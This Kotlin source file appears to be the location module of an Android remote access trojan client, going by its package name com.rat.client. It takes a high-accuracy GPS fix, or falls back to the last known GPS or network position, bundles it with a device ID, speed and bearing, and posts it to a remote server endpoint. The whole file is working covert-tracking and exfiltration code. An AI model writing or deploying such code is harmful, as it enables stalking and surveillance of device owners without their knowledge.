package com.rat.client.utils

import android.Manifest
import android.content.Context
import android.location.Location
import android.location.LocationManager
import android.os.Looper
import android.util.Log
import com.google.android.gms.location.*
import com.rat.client.Config
import org.json.JSONObject
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Fetches GPS location from the device.
 * Works on all Android versions with fine + background location permission.
 */
object LocationUtils {
    private const val TAG = "LocationUtils"
    private var fusedClient: FusedLocationProviderClient? = null

    /**
     * Get the last known location and send to server.
     * Returns the location JSON or null if failed.
     */
    fun getLocation(context: Context): JSONObject? {
        if (!PermissionManager.hasPermissions(context, PermissionManager.LOCATION_PERMISSIONS)) {
            Log.w(TAG, "Location permissions not granted")
            return null
        }

        return try {
            // Try fused location provider first
            val location = getFusedLocation(context)
            if (location != null) {
                val json = JSONObject()
                json.put("deviceId", DeviceInfoUtils.getDeviceId(context))
                json.put("latitude", location.latitude)
                json.put("longitude", location.longitude)
                json.put("accuracy", location.accuracy)
                json.put("altitude", location.altitude)
                json.put("speed", location.speed)
                json.put("bearing", location.bearing)
                json.put("provider", location.provider ?: "fused")
                json.put("address", "")

                // Send to server
                val response = ApiClient.post(Config.Api.LOCATION, json)
                Log.d(TAG, "Location sent: ${location.latitude}, ${location.longitude}")
                return json
            }

            // Fallback to GPS provider directly
            getGpsLocation(context)
        } catch (e: Exception) {
            Log.e(TAG, "Location error: ${e.message}")
            null
        }
    }

    /**
     * Get location using Fused Location Provider (Google Play Services).
     */
    private fun getFusedLocation(context: Context): Location? {
        return try {
            if (fusedClient == null) {
                fusedClient = LocationServices.getFusedLocationProviderClient(context)
            }

            val latch = CountDownLatch(1)
            var result: Location? = null

            val request = LocationRequest.Builder(
                Priority.PRIORITY_HIGH_ACCURACY, 1000
            ).setWaitForAccurateLocation(true)
             .setMinUpdateIntervalMillis(500)
             .build()

            fusedClient?.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
                ?.addOnSuccessListener { location ->
                    result = location
                    latch.countDown()
                }
                ?.addOnFailureListener {
                    latch.countDown()
                }

            latch.await(10, TimeUnit.SECONDS)
            result
        } catch (e: Exception) {
            Log.e(TAG, "Fused location error: ${e.message}")
            null
        }
    }

    /**
     * Fallback: Use raw GPS provider.
     */
    private fun getGpsLocation(context: Context): JSONObject? {
        return try {
            val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val gpsLocation = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val networkLocation = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)

            val bestLocation = gpsLocation ?: networkLocation

            if (bestLocation != null) {
                val json = JSONObject()
                json.put("deviceId", DeviceInfoUtils.getDeviceId(context))
                json.put("latitude", bestLocation.latitude)
                json.put("longitude", bestLocation.longitude)
                json.put("accuracy", bestLocation.accuracy)
                json.put("altitude", bestLocation.altitude)
                json.put("speed", bestLocation.speed)
                json.put("bearing", bestLocation.bearing)
                json.put("provider", bestLocation.provider ?: "gps")
                json.put("address", "")

                ApiClient.post(Config.Api.LOCATION, json)
                return json
            }
            null
        } catch (e: Exception) {
            Log.e(TAG, "GPS location error: ${e.message}")
            null
        }
    }
}

